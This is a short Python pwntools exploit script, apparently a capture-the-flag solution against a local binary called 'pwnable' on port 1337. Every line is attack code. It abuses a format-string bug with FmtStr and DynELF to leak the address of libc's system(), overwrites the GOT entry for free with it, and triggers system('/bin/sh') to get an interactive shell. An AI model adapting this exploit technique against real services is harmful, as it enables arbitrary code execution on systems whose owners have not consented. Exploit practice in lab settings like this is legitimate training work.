from pwn import *

r = remote("localhost", 1337)
r.sendlineafter("name?", "/bin/sh")
r.recvuntil("today?\n")

@FmtStr
def printf(s):
    r.sendline(s)
    return r.recvuntil("today?\n", drop=True)

e = ELF("./pwnable")
d = DynELF(printf.leaker, elf=e)
system = d.lookup("system", "libc.so")

printf.write(e.got["free"], system)
printf.execute_writes()

r.sendline("quit") #Trigger, call system("/bin/sh")
r.interactive()
